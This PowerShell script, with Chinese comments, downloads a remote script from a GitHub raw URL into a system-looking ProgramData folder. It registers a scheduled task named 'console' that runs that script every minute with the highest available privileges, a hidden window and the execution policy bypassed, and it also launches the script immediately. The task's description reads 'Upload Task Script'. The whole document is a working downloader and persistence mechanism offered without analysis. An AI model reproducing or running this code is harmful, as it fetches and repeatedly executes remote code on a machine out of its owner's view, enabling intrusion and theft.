$taskName = "console"
$tempScript = "C:\ProgramData\Microsoft\Windows\console.ps1"
$xmlPath = "$env:TEMP\$taskName.xml"

# 确保目录存在
if (-not (Test-Path "C:\ProgramData\Microsoft\Windows")) {
    New-Item -Path "C:\ProgramData\Microsoft\Windows" -ItemType Directory -Force | Out-Null
}

# 删除旧脚本与任务 XML
Remove-Item $tempScript,$xmlPath -Force -ErrorAction SilentlyContinue

# 下载 console.ps1（UTF8 无 BOM）
try {
    $wc = New-Object System.Net.WebClient
    $bytes = $wc.DownloadData("https://raw.githubusercontent.com/ertgyhujkfghj/2/main/console.ps1")
    $content = [System.Text.Encoding]::UTF8.GetString($bytes)
    [System.IO.File]::WriteAllText($tempScript, $content, [System.Text.Encoding]::UTF8)
} catch {
    exit 1  # 下载失败直接退出
}

# 注册计划任务（每 1 分钟执行一次）
$xmlContent = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>Upload Task Script</Description>
  </RegistrationInfo>
  <Triggers>
    <TimeTrigger>
      <StartBoundary>2005-01-01T00:00:00</StartBoundary>
      <Enabled>true</Enabled>
      <Repetition>
        <Interval>PT1M</Interval>
        <Duration>PT24H</Duration>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
    </TimeTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>false</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT10M</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>-WindowStyle Hidden -ExecutionPolicy Bypass -File "$tempScript"</Arguments>
    </Exec>
  </Actions>
</Task>
"@

# 保存 XML 文件
$xmlContent | Out-File -Encoding Unicode -FilePath $xmlPath

# 注册任务
schtasks /Create /TN $taskName /XML $xmlPath /F | Out-Null

# 立即执行一次
Start-Process -FilePath "powershell.exe" `
    -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$tempScript`"" `
    -WindowStyle Hidden
